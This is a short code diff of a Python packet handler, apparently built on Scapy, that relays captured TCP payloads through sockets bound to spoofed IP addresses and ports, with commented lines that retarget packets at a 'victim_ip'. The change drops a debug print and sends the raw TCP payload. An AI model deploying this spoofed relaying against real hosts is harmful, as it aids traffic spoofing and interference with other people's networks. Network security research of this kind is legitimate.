@@ -230,7 +230,6 @@ def packet_received(packet):
 				rand_port = spoof_IP_and_ports[rand_i][1]
 				rand_socket = spoof_IP_sockets[rand_i]
 
-				print(packet[TCP].payload)
 				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
@@ -238,7 +237,7 @@ def packet_received(packet):
 				try:
 					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
 					#rand_socket.send(custom.to_bytes())
-					rand_socket.send(to_bytes(from_bytes(raw(packet))))
+					rand_socket.send(packet[TCP].payload)
 				except:
 					print('Relaying message FAILED')
 
